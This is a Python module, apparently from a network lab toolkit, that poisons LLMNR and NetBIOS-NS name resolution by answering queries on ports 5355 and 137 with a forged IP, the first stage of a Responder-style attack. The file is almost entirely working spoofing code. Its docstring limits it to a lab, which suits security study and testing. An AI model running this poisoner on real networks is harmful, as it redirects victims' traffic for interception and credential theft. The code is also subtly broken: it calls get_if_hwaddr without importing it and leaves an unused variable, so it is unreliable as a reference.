"""Answer LLMNR and NetBIOS-NS name queries with our IP.

This is the poisoning half of a Responder-style lab. It does not relay
credentials. Run it on the lab segment only.
"""

from __future__ import annotations

import socket
import time
from typing import Any

from scapy.all import DNS, DNSQR, DNSRR, Ether, IP, UDP, conf, sendp, sniff  # type: ignore

from netlab.base import BaseModule, ModuleParam


def _decode_nbns_name(encoded: bytes) -> str:
    # First label length is usually 32, then 32 half-ascii chars.
    if len(encoded) < 33:
        return ""
    length = encoded[0]
    body = encoded[1 : 1 + length]
    chars = []
    for i in range(0, len(body) - 1, 2):
        chars.append(chr(((body[i] - 65) << 4) | (body[i + 1] - 65)))
    return "".join(chars).rstrip(" \x00")


class LlmnrPoison(BaseModule):
    name = "llmnr_poison"
    description = "Poison LLMNR (5355) and NetBIOS-NS (137) queries"
    category = "app"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(name="interface", type="interface", label="Interface", required=False,
                default=None),
            ModuleParam(
                name="respond_ip",
                type="ip",
                label="IP to advertise",
                required=True,
                description="Usually this machine's lab address",
            ),
            ModuleParam(
                name="name_filter",
                type="str",
                label="Name filter",
                required=False,
                default="*",
                description="Substring, or * for every name",
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=60,
                description="0 = until Stop",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        iface = params["interface"]
        respond_ip = params["respond_ip"]
        name_filter = str(params.get("name_filter") or "*").lower()
        duration = int(params.get("duration", 60))
        conf.iface = iface
        conf.verb = 0
        our_mac = get_if_hwaddr(iface)
        start = time.time()
        print(f"[llmnr_poison] {iface} -> answering with {respond_ip}")

        def wanted(name: str) -> bool:
            if name_filter in ("", "*"):
                return True
            return name_filter in name.lower()

        def handle(pkt) -> None:
            if self.should_stop() or not pkt.haslayer(UDP) or not pkt.haslayer(IP):
                return
            dport = int(pkt[UDP].dport)
            if dport == 5355 and pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                if not wanted(qname):
                    return
                rate_limiter.wait()
                ether_src = our_mac or pkt[Ether].dst
                reply = (
                    Ether(src=ether_src, dst=pkt[Ether].src)
                    / IP(src=respond_ip, dst=pkt[IP].src)
                    / UDP(sport=5355, dport=pkt[UDP].sport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=30, rdata=respond_ip),
                    )
                )
                sendp(reply, iface=iface, verbose=0)
                logger.add_packets(1, len(bytes(reply)))
                print(f"  LLMNR {qname} -> {respond_ip}")
                return

            if dport == 137:
                payload = bytes(pkt[UDP].payload)
                if len(payload) < 12:
                    return
                name = _decode_nbns_name(payload[12:])
                if name and not wanted(name):
                    return
                # Rebuild a minimal positive NBNS response: copy header, set response flags.
                header = bytearray(payload[:12])
                header[2] = 0x85
                header[3] = 0x00
                header[6] = 0x00
                header[7] = 0x01  # one answer
                question = payload[12:]
                # name + type + class, then answer body
                answer = question
                # NBNS answer: name pointer to offset 12, type NB, class IN, ttl, rdata
                if len(question) < 34:
                    return
                qname_raw = question[:34]
                nb_answer = (
                    qname_raw
                    + b"\x00\x20\x00\x01"  # type NB, class IN
                    + b"\x00\x00\x00\x1e"  # ttl 30
                    + b"\x00\x06"
                    + b"\x00\x00"
                    + socket.inet_aton(respond_ip)
                )
                header[4] = 0x00
                header[5] = 0x01
                rate_limiter.wait()
                ether_src = our_mac or pkt[Ether].dst
                reply = (
                    Ether(src=ether_src, dst=pkt[Ether].src)
                    / IP(src=respond_ip, dst=pkt[IP].src)
                    / UDP(sport=137, dport=pkt[UDP].sport)
                    / (bytes(header) + nb_answer)
                )
                sendp(reply, iface=iface, verbose=0)
                logger.add_packets(1, len(bytes(reply)))
                print(f"  NBNS {name or '?'} -> {respond_ip}")

        try:
            sniff(
                iface=iface,
                filter="udp and (port 5355 or port 137)",
                prn=handle,
                store=0,
                timeout=duration if duration > 0 else None,
                stop_filter=lambda _: self.should_stop()
                or (duration > 0 and (time.time() - start) >= duration),
            )
        except KeyboardInterrupt:
            print("\n[llmnr_poison] Interrupted")
        print("[llmnr_poison] Done")
